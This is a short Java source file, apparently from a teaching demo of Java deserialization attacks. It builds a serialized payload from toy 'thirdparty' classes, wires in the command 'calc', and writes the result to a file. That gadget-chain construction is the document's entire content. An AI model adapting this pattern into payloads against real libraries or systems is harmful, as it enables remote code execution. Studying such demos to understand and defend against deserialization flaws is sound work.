package run.ergou.deserialize.demo1.attacker;

import run.ergou.deserialize.demo1.thirdparty.Risk;
import run.ergou.deserialize.demo1.thirdparty.Controlled;
import run.ergou.deserialize.demo1.thirdparty.ReadObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;

// 创建payload
public class CreatePayload {
    public static void main(String[] args) throws Exception {

        Risk risk = new Risk();
        Controlled controlled = new Controlled("calc");

        ReadObject readObject = new ReadObject(risk);
        readObject.setControlled(controlled);

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(new File("demo1")));
        oos.writeObject(readObject);
        oos.close();

    }
}
